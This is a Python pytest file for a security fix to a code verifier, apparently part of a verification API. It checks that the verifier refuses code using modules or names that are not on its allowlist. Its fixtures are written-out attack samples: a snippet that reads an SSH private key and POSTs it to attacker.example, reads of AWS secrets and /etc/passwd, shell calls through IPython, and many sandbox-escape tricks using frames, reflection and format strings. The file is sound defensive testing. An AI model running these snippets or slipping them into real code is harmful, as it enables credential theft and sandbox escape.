"""GHSA-9r7q: Python code is admitted only when it uses listed modules and names.

CodeVerifier refused code by lists of dangerous names, and code that used a
module missing from them was admitted: io.FileIO read and wrote any file,
urllib3 sent data out, pickle.Unpickler loaded a pickle, multiprocessing
started processes and os.environ read secrets. Now every module code imports
must be on code_admission's list, and every name it uses from one must be
listed for that module; a module used as a value, a write into a module and a
frame or traceback read are refused too, and so is any builtin not listed
(license, help, vars, globals, ...). The sandbox's executor passes the
third-party modules its import guard confines as trusted.
"""

import ast
import builtins
import importlib
import types
import uuid
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from qwed_new.api import main as api_main
from qwed_new.core import code_admission
from qwed_new.core.code_admission import ADMITTED_MODULES, STAR_IMPORT_MODULES
from qwed_new.core.code_verifier import CodeVerifier
from qwed_new.core.diagnostics import admission_decision
from qwed_new.core.secure_code_executor import SANDBOX_THIRD_PARTY_MODULES, SecureCodeExecutor
from qwed_new.core.tenant_context import TenantContext

REPORTED = {
    "file read and network send": (
        "import io, urllib3\n"
        "key = io.FileIO('/home/user/.ssh/id_rsa').read()\n"
        "urllib3.PoolManager().request('POST', 'https://attacker.example/collect', body=key)\n"
    ),
    "file write": "import io\nio.FileIO('/tmp/out', 'w').write(b'x')\n",
    "unpickling": "import io, pickle\npickle.Unpickler(io.BytesIO(data)).load()\n",
    "process": "import multiprocessing\nmultiprocessing.Process(target=f).start()\n",
    "environment": "import os\nprint(os.environ['AWS_SECRET_ACCESS_KEY'])\n",
}


def _issues(code, verifier=None):
    result = (verifier or CodeVerifier()).verify_code(code, language="python")
    return result, {(i["type"], i["pattern"]) for i in result.developer_fields.get("issues", [])}


def _assert_refused(code, verifier=None):
    result, _ = _issues(code, verifier)
    assert result.developer_fields["is_safe"] is False, result.developer_fields
    assert admission_decision(result).value == "BLOCKED"


def _assert_admitted(code, verifier=None):
    result, issues = _issues(code, verifier)
    assert result.developer_fields["is_safe"] is True, issues
    assert admission_decision(result).value == "ADMIT"


@pytest.mark.parametrize("code", REPORTED.values(), ids=REPORTED.keys())
def test_the_reported_code_is_refused(code):
    _assert_refused(code)


def test_the_findings_name_the_module_and_the_name():
    _, issues = _issues(REPORTED["file read and network send"])
    assert ("attribute_not_admitted", "io.FileIO") in issues
    assert ("module_not_admitted", "urllib3") in issues
    _, issues = _issues(REPORTED["environment"])
    assert ("attribute_not_admitted", "os.environ") in issues


# Every way a name reaches code: an import, an alias, a from-import, a star
# import, and modules that other modules import under their own names.
NOT_LISTED = [
    "from io import FileIO\nFileIO('p').read()",
    "import io as m\nm.FileIO('p').read()",
    "import io\nF = io.FileIO\nF('p')",
    "import _io\n_io.FileIO('p')",
    "from io import *\nFileIO('p')",
    "from os import environ\nprint(environ['K'])",
    "from os import *\nprint(environ['K'])",
    "import os\nos.getenv('K')",
    "import os\nos.environ.get('K')",
    "import os\nos.write(1, b'x')",
    "import os\nos.path.exists('/etc/passwd')",
    "import os.path as p\np.expanduser('~')",
    "from os.path import getsize\ngetsize('/etc/passwd')",
    "import sys\nsys.stdout.buffer.raw",
    "import sys\nsys.modules.get('os')",
    "import sys\nsys._getframe()",
    "import pickle\npickle.loads(b)",
    "from pickle import loads\nloads(b)",
    "import marshal\nmarshal.loads(b)",
    "import socket\nsocket.getaddrinfo('host.example', 80)",
    "import multiprocessing\nmultiprocessing.Pool()",
    "from concurrent.futures import ProcessPoolExecutor\nProcessPoolExecutor()",
    "import asyncio\nasyncio.run(main())",
    "import logging\nlogging.getLogger(__name__).info('x')",
    "import warnings\nwarnings.formatwarning('m', UserWarning, '/etc/passwd', 1)",
    "import string\nstring.Formatter().get_field('0', [x], {})",
    "import operator\noperator.methodcaller('upper')",
    "import types\ntypes.CodeType",
    "import uuid\nuuid.getnode()",
    "import contextlib\ncontextlib.chdir('/')",
    "import contextlib, io\ncontextlib.redirect_stdout(io.StringIO())",
    "import pprint\npprint.PrettyPrinter()",
    "import gzip\ngzip.open('/etc/passwd')",
    "import ast\nast.main()",
    "import random\nrandom._os.getenv('K')",
    "import typing\ntyping.sys.modules.get('os')",
    "import collections\ncollections._sys.modules.get('os')",
    "import dataclasses\ndataclasses.sys.modules.get('os')",
    "import json\njson.codecs.open('/etc/passwd')",
    "import json.decoder\njson.decoder.JSONDecoder()",
    "from json import decoder\ndecoder.JSONDecoder()",
    "import numpy as np\nnp.load('p', allow_pickle=True)",
    "import requests\nrequests.get('https://example.com')",
    "import yaml\nyaml.full_load(s)",
    "from . import secrets_store\nsecrets_store.read()",
]


@pytest.mark.parametrize("code", NOT_LISTED)
def test_a_module_or_name_not_on_the_list_is_refused(code):
    _assert_refused(code)


# A module object handed on reaches every attribute it has.
MODULE_VALUES = [
    "import json\nm = json\nm.codecs.open('/etc/passwd')",
    "import json\nvars(json)['codecs'].open('/etc/passwd')",
    "import json\nprint(json)",
    "import json\ndef f(m=json):\n    return m\n",
    "import os\np = os.path\np.exists('/etc/passwd')",
    "from os import path\nhelper(path)",
    "import json\n[json][0]",
]


@pytest.mark.parametrize("code", MODULE_VALUES)
def test_a_module_used_as_a_value_is_refused(code):
    _assert_refused(code)
    _, issues = _issues(code)
    assert any(kind == "module_reference" for kind, _ in issues), issues


# A module imported in a class body, or read back from a namespace, reaches
# code without its import name.
@pytest.mark.parametrize("code, kind", [
    ("class A:\n    import os\nprint(A.os.environ)", "module_reference"),
    ("class A:\n    from os import path\nA.path.exists('/etc/passwd')", "module_reference"),
    ("class A:\n    import json\nvars(A)['json'].codecs", "module_reference"),
    ("import os\nprint(globals()['os'].environ)", "builtin_not_admitted"),
    ("def f():\n    import os\n    return locals()\nf()['os'].environ", "builtin_not_admitted"),
    ("import os\nvars()['os'].getenv('K')", "builtin_not_admitted"),
    ("import json\nns = globals\n[m for m in ns().values()]", "builtin_not_admitted"),
])
def test_a_module_reached_without_its_import_name_is_refused(code, kind):
    _assert_refused(code)
    _, issues = _issues(code)
    assert any(found == kind for found, _ in issues), issues


@pytest.mark.parametrize("code", [
    "class C:\n    from typing import Any as Base",
    "class C:\n    def f(self):\n        import json\n        return json.dumps(1)",
])
def test_class_bodies_that_bind_no_module_are_admitted(code):
    _assert_admitted(code)


# Builtins not on the list reach files, code, modules or a namespace, so
# each is refused wherever its name is read, bound in the code or not.
REFUSED_BUILTINS = [
    ("license._Printer__filenames = ['/etc/passwd']\nlicense()", "license"),
    ("c = credits\nc._Printer__filenames = ['/etc/passwd']\nc()", "credits"),
    ("copyright()", "copyright"),
    ("help('json')", "help"),
    ("h = help\nh('json')", "help"),
    ("breakpoint()", "breakpoint"),
    ("T = type\nk = [x for x in dir(T) if x.startswith('__su')][0]\nvars(T)[k](object)", "vars"),
    ("import json\nclass A:\n    def d(self):\n        return json.dumps(vars(self))", "vars"),
    ("@vars\nclass A:\n    pass", "vars"),
    ("g = globals()\nprint(list(g))", "globals"),
    ("def f(x):\n    return locals()", "locals"),
    ("class A:\n    x = 1\ndelattr(A, 'x')", "delattr"),
    ("m = memoryview(b'abc')", "memoryview"),
    ("def body():\n    pass\n__build_class__(body, 'C')", "__build_class__"),
    ("__lazy_import__('json')", "__lazy_import__"),
    ("get_ipython().system('id')", "get_ipython"),
    ("f = open\nf('/etc/passwd')", "open"),
    ("def f(h=help):\n    return h", "help"),
    ("print(f'{license}')", "license"),
    ("class G:\n    def __radd__(self, other):\n        return other\nhelp += G()", "help"),
    # At module level the name falls back to the builtin until it is bound.
    ("help = 'usage'\nprint(help)", "help"),
    ("def f(help):\n    return help", "help"),
]


@pytest.mark.parametrize("code, name", REFUSED_BUILTINS)
def test_a_builtin_not_on_the_list_is_refused(code, name):
    _assert_refused(code)
    _, issues = _issues(code)
    assert ("builtin_not_admitted", name) in issues, issues


@pytest.mark.parametrize("name", sorted(code_admission.ADMITTED_BUILTINS))
def test_a_listed_builtin_is_admitted(name):
    _assert_admitted(f"x = {name}")


@pytest.mark.parametrize("code", [
    "if __name__ == '__main__':\n    print(sorted({abs(-2), round(2.5)}), isinstance(1, int), hasattr(1, 'real'))",
    "class A(Exception):\n    def __init__(self):\n        super().__init__('x')\n"
    "try:\n    raise A()\nexcept (A, ValueError) as e:\n    print(type(e).__name__, repr(e))",
    "x = input()\nprint(dir(), len(x), id(x) > 0)\nexit(0) if x else quit()",
    "help_text = 'usage'\nself_exit = 0\nprint(help_text, self_exit)",
    "class A:\n    def help(self):\n        return self.license\nprint(A().help, dict(help=1))",
])
def test_code_that_reads_listed_builtins_is_admitted(code):
    _assert_admitted(code)


# Attributes read by a name: each of these reaches a function's globals, the
# builtin getattr, a module's namespace or an attribute named at run time.
REFLECTION = [
    # Special attributes not listed.
    ("ga = [].append.__reduce__()[0]", "special_attribute"),
    ("ga = (1).bit_length.__reduce_ex__(2)[0]", "special_attribute"),
    ("def g(self):\n    pass\nb = g.__get__(5)", "special_attribute"),
    ("import json\nprint(json.dumps.__defaults__)", "special_attribute"),
    ("def f():\n    x = 1\n    return lambda: x\nprint(f().__closure__)", "special_attribute"),
    ("m = [].append\nprint(m.__func__ if False else 1)", "special_attribute"),
    ("class A:\n    pass\nprint(A().__getstate__())", "special_attribute"),
    ("match f:\n    case object(__reduce__=r):\n        pass", "special_attribute"),
    ("class P:\n    pass\nP.__match_args__ = ('a',)", "special_attribute"),
    # Private methods that read the module table or evaluate code.
    ("import enum\nX = enum.Enum._convert_('X', 'os', lambda n: n == 'system')", "special_attribute"),
    ("import enum\nclass C(enum.Enum):\n    A = 1\nC._convert_('X', 'os', len)", "special_attribute"),
    ("import string\nstring.Template._compile_pattern()", "special_attribute"),
    # Under IPython and Jupyter, exit and quit hold the shell in _ip.
    ("exit._ip.system('id')", "special_attribute"),
    # str.format reads the attribute a field names.
    ("import json\nfmt = ''.join(map(chr, [123, 48, 125]))\nprint(fmt.format(json.dumps))", "dynamic_lookup"),
    ("print('{0.real}'.format(3))", "dynamic_lookup"),
    ("print('{0:{1.real}}'.format(3, 4))", "dynamic_lookup"),
    ("print('{0.real}'.format_map({}))", "dynamic_lookup"),
    ("print(str.format('{}', 3))", "dynamic_lookup"),
    ("t = '{}'\nt = input()\nprint(t.format(3))", "dynamic_lookup"),
    ("print('{0'.format(3))", "dynamic_lookup"),
    ("from math import *\nT = '{}'\nprint(T.format(1))", "dynamic_lookup"),
    # Helpers that copy or read attributes by a name, outside their decorator use.
    ("import functools\np = functools.wraps(g)\np(f, updated=('x',))", "dynamic_lookup"),
    ("from functools import wraps\nw = wraps", "dynamic_lookup"),
    ("import functools\n@functools.wraps(g, assigned=('x',))\ndef f():\n    pass", "dynamic_lookup"),
    ("import functools\n@functools.wraps\nclass A:\n    pass", "dynamic_lookup"),
    ("import dataclasses\nD = dataclasses.dataclass(type('D', (), {}))", "dynamic_lookup"),
    ("import dataclasses, enum\n@dataclasses.dataclass(init=False)\nclass M(enum.EnumType):\n    x: int = 0",
     "dynamic_lookup"),
    ("import dataclasses\nB = type('B', (), {})\n@dataclasses.dataclass\nclass D(B):\n    x: int = 0", "dynamic_lookup"),
    ("from dataclasses import dataclass\n@dataclass\nclass M(type):\n    _convert_: int = 0", "special_attribute"),
    # Class patterns on a class whose __match_args__ code sets at run time.
    ("M = type('M', (), {})\nmatch v:\n    case M(x):\n        pass", "dynamic_lookup"),
    ("k = 'a'\nclass P:\n    __match_args__ = (k,)\nmatch v:\n    case P(x):\n        pass", "dynamic_lookup"),
    ("class P:\n    __match_args__ = ('__reduce__',)\nmatch v:\n    case P(x):\n        pass", "dynamic_lookup"),
    ("B = type('B', (), {})\nclass P(B):\n    pass\nmatch v:\n    case P(x):\n        pass", "dynamic_lookup"),
    ("int = type('I', (), {})\nmatch v:\n    case int(x):\n        pass", "dynamic_lookup"),
    ("class P:\n    pass\nP = type('P', (), {})\nmatch v:\n    case P(x):\n        pass", "dynamic_lookup"),
    ("def deco(c):\n    return c\n@deco\nclass P:\n    pass\nmatch v:\n    case P(x):\n        pass",
     "dynamic_lookup"),
    ("import collections\nclass P(collections.namedtuple('P', 'a')):\n    pass\nmatch v:\n    case P(x):\n"
     "        pass", "dynamic_lookup"),
    ("class O:\n    class P:\n        pass\nmatch v:\n    case O.P(x):\n        pass", "dynamic_lookup"),
    ("def f(t):\n    return t.format(1)", "dynamic_lookup"),
    # Until the code binds it, str is the builtin, whose format takes any template.
    ("print(str.format(t, 1))\nstr = '{}'", "dynamic_lookup"),
    # A metaclass of the code's own can set __match_args__ and answer isinstance.
    ("class M(type):\n    def __new__(m, n, b, ns):\n        ns['__match_args__'] = (k,)\n"
     "        return super().__new__(m, n, b, ns)\nclass P(metaclass=M):\n    pass\n"
     "match v:\n    case P(x):\n        pass", "dynamic_lookup"),
    ("print('{0:{1:{2:{3}}}}'.format(1, 2, 3, 4))", "dynamic_lookup"),
]


@pytest.mark.parametrize("code, kind", REFLECTION)
def test_an_attribute_read_by_a_name_is_refused(code, kind):
    _assert_refused(code)
    _, issues = _issues(code)
    assert any(found == kind for found, _ in issues), issues


@pytest.mark.parametrize("code", [
    "print('{} and {name:>{w}}'.format(1, name='x', w=5), '{0[k]}'.format({'k': 1}))",
    "T = 'Hello {}'\nprint(T.format('x'), T.format('y'))",
    "T: str = '{0[a]}'\nprint(T.format_map({'0': {'a': 1}}))",
    "from dataclasses import dataclass, asdict, field\n@dataclass(frozen=True)\nclass P:\n    x: int\n"
    "    y: list = field(default_factory=list)\nprint(asdict(P(1)))",
    "import dataclasses, typing\nT = typing.TypeVar('T')\n@dataclasses.dataclass\nclass B(typing.Generic[T]):\n"
    "    x: int\n@dataclasses.dataclass\nclass C(B):\n    y: int = 0",
    "import functools\ndef deco(f):\n    @functools.wraps(f)\n    def w(*a):\n        return f(*a)\n    return w",
    "from dataclasses import dataclass\n@dataclass\nclass P:\n    x: int\nmatch P(1):\n    case P(x):\n"
    "        print(x)\n    case int(n) | str(n):\n        pass",
    "import ast\nmatch ast.parse('x').body[0]:\n    case ast.Expr(value):\n        print(value)",
    "import abc\nclass P(metaclass=abc.ABCMeta):\n    __match_args__ = ('a',)\n    a = 1\nmatch P():\n"
    "    case P(a):\n        print(a)",
    "class P:\n    __match_args__ = ('x', 'y')\n    def __init__(self):\n        self.x = self.y = 1\n"
    "match P():\n    case P(a, b):\n        print(a + b)",
    "class A:\n    def __init__(self):\n        super().__init__()\n        self._items = []\n"
    "    def __repr__(self):\n        return type(self).__name__\nA.__doc__ = 'x'\nprint(A().__repr__(), A.__mro__)",
    "import enum\nclass C(enum.Enum):\n    A = 1\nprint(C.A.name, C['A'].value, C.__members__)",
    "import copy\nprint(copy.deepcopy([1]))",
])
def test_attributes_read_by_fixed_names_are_admitted(code):
    _assert_admitted(code)


def test_a_dataclass_on_a_class_this_check_cannot_resolve_is_refused():
    trusted = CodeVerifier(trusted_modules={"numpy"})
    _assert_refused("import dataclasses, numpy\n@dataclasses.dataclass\nclass D(numpy.ndarray):\n    x: int = 0", trusted)
    assert code_admission._holds_reflective_private("json.NoSuchName") is True
    assert code_admission._holds_reflective_private("json.dumps") is False  # not a class
    assert code_admission._holds_reflective_private("json.JSONEncoder") is False
    assert code_admission._holds_reflective_private("enum.Enum") is True
    code_admission._holds_reflective_private.cache_clear()
    try:
        with patch.object(code_admission.importlib, "import_module", side_effect=ImportError):
            assert code_admission._holds_reflective_private("json.JSONEncoder") is True
    finally:
        code_admission._holds_reflective_private.cache_clear()


def test_the_special_attribute_lists_hold_only_special_names():
    for name in code_admission.ADMITTED_DUNDERS | code_admission.WRITABLE_DUNDERS:
        assert name.startswith("__") and name.endswith("__"), name
    assert code_admission.WRITABLE_DUNDERS - code_admission.ADMITTED_DUNDERS == set()
    assert "__match_args__" not in code_admission.WRITABLE_DUNDERS


_RISKY_CODE_NAMES = {
    "getattr", "setattr", "delattr", "modules", "__import__", "import_module", "eval", "exec", "compile",
    "open", "globals", "vars", "locals", "_getframe", "_getframemodulename", "f_globals", "f_locals",
    "f_back", "system", "popen", "environ", "getenv", "__builtins__", "__globals__", "stdout", "stderr",
    "stdin",
}


def _code_names(code):
    found = set(code.co_names)
    for const in code.co_consts:
        if isinstance(const, types.CodeType):
            found |= _code_names(const)
    return found


def _listed_classes_and_metaclasses():
    pending = [
        value for module in ADMITTED_MODULES
        for value in vars(importlib.import_module(module)).values() if isinstance(value, type)
    ]
    seen = set()
    while pending:
        klass = pending.pop()
        new = {*klass.__mro__, *type(klass).__mro__} - seen
        seen |= new
        pending.extend(new)
    return {klass for klass in seen if klass.__module__ != "builtins"}


def _is_risky(value):
    value = value.__func__ if isinstance(value, (classmethod, staticmethod)) else value
    functions = [value.fget, value.fset] if isinstance(value, property) else [value]
    return any(getattr(f, "__code__", None) and _code_names(f.__code__) & _RISKY_CODE_NAMES for f in functions)


def _reflective_privates_of_this_python():
    """The private methods of the listed modules' classes (and metaclasses)
    whose code names something that reads the module table or a frame,
    writes to a standard stream, or evaluates, compiles or looks attributes
    up by name: how REFLECTIVE_PRIVATES was found."""
    return {
        name for owner in _listed_classes_and_metaclasses() for name, value in vars(owner).items()
        if name.startswith("_") and not (name.startswith("__") and name.endswith("__")) and _is_risky(value)
    }


def test_every_reflective_private_of_this_python_is_listed():
    assert _reflective_privates_of_this_python() <= code_admission.REFLECTIVE_PRIVATES


@pytest.mark.parametrize("code", [
    "import json\njson.dumps = print",
    "import json\ndel json.loads",
    "from json import JSONDecoder\nJSONDecoder.decode = f",
    "import os\nos.path = None",
])
def test_a_write_into_a_module_is_refused(code):
    _assert_refused(code)
    _, issues = _issues(code)
    assert any(kind == "module_write" for kind, _ in issues), issues


@pytest.mark.parametrize("code", [
    "g = (x for x in [1])\ng.gi_frame.f_builtins['open']('/etc/passwd')",
    "try:\n    1 / 0\nexcept Exception as e:\n    e.__traceback__.tb_frame.f_globals",
    "import sys\nsys.exc_info()[2].tb_frame.f_back",
    "async def c():\n    pass\nc().cr_frame",
    "async def a():\n    yield 1\na().ag_frame",
    "def f():\n    yield\nmatch f():\n    case object(gi_frame=fr):\n        fr.f_builtins",
])
def test_frame_and_traceback_reads_are_refused(code):
    _assert_refused(code)
    _, issues = _issues(code)
    assert any(kind == "frame_introspection" for kind, _ in issues), issues


ADMITTED = [
    "def add(a, b):\n    return a + b\n",
    "import math\nprint(math.sqrt(2) + math.pi)",
    "from math import *\nprint(sqrt(16), floor(2.5))",
    "import json\ndata = json.loads('{\"a\": 1}')\nprint(json.dumps(data, indent=2))",
    "import re\npattern = re.compile(r'[0-9]+')\nprint(pattern.findall('a1b22'), re.sub('a', 'b', 'aaa'))",
    "from datetime import datetime, timedelta, timezone\nprint((datetime.now(timezone.utc) + timedelta(days=1)).isoformat())",
    "from collections import Counter, defaultdict, namedtuple, deque\nP = namedtuple('P', 'x y')\nprint(Counter('ab'), P(1, 2), deque([1]))",
    "import collections.abc\nfrom collections.abc import Mapping\nprint(isinstance({}, collections.abc.Mapping), Mapping)",
    "from __future__ import annotations\nfrom typing import List, Optional, TypeVar, Generic\nT = TypeVar('T')\n"
    "class Box(Generic[T]):\n    pass\ndef f(xs: List[int], m: Optional[int] = None) -> int:\n    return sum(xs)",
    "from dataclasses import dataclass, field, asdict\n@dataclass\nclass User:\n    name: str\n    tags: list = field(default_factory=list)\nprint(asdict(User('a')))",
    "from dataclasses import dataclass\n@dataclass\nclass P:\n    x: int",
    "import functools, itertools\n@functools.lru_cache(maxsize=None)\ndef fib(n):\n    return n if n < 2 else fib(n - 1) + fib(n - 2)\n"
    "print(list(itertools.islice(itertools.count(), 5)))",
    "import operator\nfrom operator import itemgetter\nprint(sorted([(1, 'b')], key=itemgetter(0)), operator.add(1, 2))",
    "from enum import Enum, auto\nclass Color(Enum):\n    RED = auto()\nprint(Color.RED.name)",
    "from decimal import Decimal, getcontext\nfrom fractions import Fraction\nimport statistics\ngetcontext().prec = 30\n"
    "print(Decimal(1) / Decimal(7), Fraction(1, 3), statistics.mean([1, 2, 3]))",
    "import secrets, hashlib\nprint(secrets.token_hex(8), hashlib.sha256(b'x').hexdigest())",
    "import string, textwrap\nprint(string.ascii_lowercase, textwrap.fill('word ' * 20, width=30))",
    "import os\nprint(os.path.join('a', 'b'), os.path.splitext('x.txt'), os.sep)",
    "from os.path import join, dirname\nprint(join(dirname('/a/b/c'), 'd'))",
    "import csv, io\nbuf = io.StringIO()\ncsv.writer(buf).writerow([1, 2])\nprint(buf.getvalue(), list(csv.reader(io.StringIO('a,b'))))",
    "from urllib.parse import urlparse, urlencode\nprint(urlparse('https://example.com/a').netloc, urlencode({'q': 'x'}))",
    "import urllib.parse\nprint(urllib.parse.quote('a b'))",
    "import sys\nif len(sys.argv) > 5:\n    sys.exit(1)\nprint(sys.version_info >= (3, 8), sys.maxsize)",
    "import time\nstart = time.perf_counter()\nprint(time.perf_counter() - start, time.strftime('%Y'))",
    "import uuid\nprint(uuid.uuid4(), uuid.uuid5(uuid.NAMESPACE_DNS, 'x'))",
    "from abc import ABC, abstractmethod\nfrom contextlib import contextmanager, suppress\nclass B(ABC):\n    @abstractmethod\n"
    "    def f(self):\n        pass\n@contextmanager\ndef cm():\n    yield 1\nwith suppress(KeyError), cm() as v:\n    print(v)",
    "import heapq, bisect, copy, pprint\nh = [3, 1]\nheapq.heapify(h)\nprint(bisect.bisect_left([1, 3], 2), copy.deepcopy({'a': [1]}))\npprint.pprint(h)",
    "from types import SimpleNamespace\nimport types\nprint(SimpleNamespace(a=1).a, isinstance(None, types.NoneType))",
    "import base64, struct, binascii, zlib, gzip\nprint(base64.b64encode(b'x'), struct.pack('<I', 1), binascii.hexlify(b'x'), zlib.crc32(b'x'), gzip.compress(b'x'))",
    "from ast import literal_eval\nprint(literal_eval('[1, 2]'))",
    "import json\nclass A:\n    def __init__(self):\n        self.json = {}\n    def get(self):\n        return self.json.get('codecs')",
    "try:\n    x = 1 / 0\nexcept ZeroDivisionError as e:\n    print(type(e).__name__, e.args)",
    "def gen():\n    yield from range(3)\nprint(list(gen()))",
    "import graphlib, ipaddress, html, calendar\nprint(graphlib.TopologicalSorter({'b': {'a'}}), ipaddress.ip_address('10.0.0.1'), html.escape('<a>'), calendar.isleap(2024))",
]


@pytest.mark.parametrize("code", ADMITTED)
def test_code_that_uses_listed_modules_and_names_is_admitted(code):
    _assert_admitted(code)


def test_a_star_import_is_admitted_only_where_every_name_it_binds_is_listed():
    _assert_admitted("from json import *\nprint(dumps(1))")
    _, issues = _issues("from typing import *\nx = 1")
    assert ("attribute_not_admitted", "typing.*") in issues


# --- the sandbox's executor ----------------------------------------------

def test_a_trusted_module_is_not_checked():
    code = "import numpy as np\nprint(np.mean([1, 2]), np.load)"
    _assert_refused(code)
    _assert_admitted(code, CodeVerifier(trusted_modules={"numpy"}))


def test_a_trusted_module_does_not_admit_other_modules_or_frame_reads():
    trusted = CodeVerifier(trusted_modules={"numpy"})
    _assert_refused("import numpy\nimport io\nio.FileIO('p')", trusted)
    _assert_refused("g = (x for x in [1])\ng.gi_frame", trusted)


def test_the_executor_trusts_the_modules_its_sandbox_confines():
    executor = SecureCodeExecutor.__new__(SecureCodeExecutor)  # no Docker needed
    code = "import pandas as pd\nimport numpy as np\nresult = float(np.mean(pd.Series([1, 2])))"
    assert executor._is_safe_code(code).developer_fields["is_valid"] is True
    assert executor._is_safe_code("import io\nresult = io.FileIO('p').read()").developer_fields["is_valid"] is False


def _sandbox_constant(name):
    harness = SecureCodeExecutor()._wrap_code("")
    assignment = next(
        node for node in ast.walk(ast.parse(harness))
        if isinstance(node, ast.Assign) and getattr(node.targets[0], "id", None) == name
    )
    return set(ast.literal_eval(assignment.value))


def test_the_trusted_modules_are_ones_the_sandbox_guard_confines():
    sandbox = _sandbox_constant("_ALLOWED_MODULES")
    assert SANDBOX_THIRD_PARTY_MODULES <= sandbox
    # The sandbox's standard-library modules are on the list, so code it
    # runs is not refused for importing them.
    assert sandbox - SANDBOX_THIRD_PARTY_MODULES <= set(ADMITTED_MODULES)


def test_the_sandbox_builtins_are_listed():
    # Code the sandbox runs is not refused for a builtin the sandbox gives it.
    assert _sandbox_constant("_SAFE_BUILTIN_NAMES") <= code_admission.ADMITTED_BUILTINS


# --- the list itself, on the Python running the tests ----------------------

@pytest.mark.parametrize("module", sorted(ADMITTED_MODULES))
def test_each_listed_module_imports_and_its_names_are_not_modules(module):
    imported = importlib.import_module(module)
    for name in ADMITTED_MODULES[module]:
        value = getattr(imported, name, None)
        if isinstance(value, types.ModuleType):
            # math.integer (Python 3.15) holds integer functions only.
            assert (module, name) == ("math", "integer"), f"{module}.{name} is a module"


@pytest.mark.parametrize("module", sorted(STAR_IMPORT_MODULES))
def test_a_star_import_binds_only_listed_names(module):
    imported = importlib.import_module(module)
    exported = getattr(imported, "__all__", None) or [n for n in dir(imported) if not n.startswith("_")]
    unlisted = {n for n in exported if not n.startswith("__")} - ADMITTED_MODULES[module]
    assert not unlisted, f"from {module} import * binds {sorted(unlisted)}"


def test_the_builtin_list_holds_every_builtin_of_this_python():
    assert set(dir(builtins)) - {"_"} <= code_admission.BUILTIN_NAMES
    assert code_admission.ADMITTED_BUILTINS <= code_admission.BUILTIN_NAMES


def test_every_listed_submodule_has_its_parent_listed():
    for module in ADMITTED_MODULES:
        parent = module.rpartition(".")[0]
        assert not parent or parent in ADMITTED_MODULES, module


def test_a_use_that_starts_at_an_unlisted_module_is_refused():
    # Imports bind only listed modules; this keeps the check closed if one
    # ever did not.
    assert code_admission._module_use("unlisted.name", ast.Load(), frozenset()) == ("module_not_admitted", "unlisted")


def test_every_finding_blocks():
    code = "import io\nio.FileIO\nimport x\ng.gi_frame\nimport json\nm = json\njson.dumps = 1\nopen\n"
    code += "x.__reduce__\n'{0.a}'.format(1)\n"
    found = code_admission.findings(ast.walk(ast.parse(code)))
    assert {f["issue_type"] for f in found} == set(code_admission._DESCRIPTIONS)
    assert all(f["severity"] == "CRITICAL" for f in found)


# --- through the API -------------------------------------------------------

@pytest.fixture
def client(isolated_audit_chain):
    tenant = TenantContext(
        organization_id=1, organization_name="Org", tier="free",
        api_key=uuid.uuid5(uuid.NAMESPACE_URL, "qwed-module-allowlist-test").hex,
    )
    api_main.app.dependency_overrides[api_main.get_current_tenant] = lambda: tenant
    api_main.app.dependency_overrides[api_main.get_session] = lambda: MagicMock()
    try:
        with patch("qwed_new.api.main.check_rate_limit"):
            yield TestClient(api_main.app)
    finally:
        api_main.app.dependency_overrides.clear()


def test_the_api_does_not_admit_the_reported_code(client):
    body = client.post(
        "/verify/code", json={"code": REPORTED["file read and network send"], "language": "python"}
    ).json()
    assert body["admission"] == "BLOCKED"
    assert body["agent_message"] != "The code passed security verification and is safe to use."
